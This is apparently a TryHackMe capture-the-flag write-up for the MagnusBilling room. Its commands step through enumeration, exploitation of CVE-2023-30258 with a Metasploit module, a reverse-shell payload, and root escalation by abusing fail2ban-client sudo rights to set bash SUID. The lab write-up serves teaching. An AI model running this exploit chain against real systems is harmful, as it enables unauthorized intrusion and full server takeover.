**TryHackMe MagnusBilling Write-Up**

---

## 🚀 Initial Enumeration

**Target IP**: `10.10.139.180`

Nmap scan:

```bash
nmap 10.10.139.180 -sV
```

Result:

```
22/tcp   open  ssh     OpenSSH 9.2p1 Debian
80/tcp   open  http    Apache 2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

Visiting `http://10.10.139.180/` redirects to `/mbilling`.

---

## 🤖 Web App Enumeration

* App identified: **MagnusBilling** (VoIP Billing Software)
* Known vulnerable version range: v6.x and early v7.x

Discovered that the server is vulnerable to:
**CVE-2023-30258** — *Unauthenticated RCE via `icepay.php`*

---

## 🛡️ Exploitation with Metasploit

Using Metasploit module:

```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.10.139.180
set TARGETURI /mbilling/lib/icepay/icepay.php
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

Successful shell:

```
Meterpreter session opened as user: asterisk
```

---

## 🔧 Privilege Escalation

Check `sudo` rights:

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Exploit path:

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
/bin/bash -p
```

Check:

```bash
whoami  # root
```

---

## 🏆 Root Flag

```bash
cat /root/root.txt
THM{REDACTED}
```


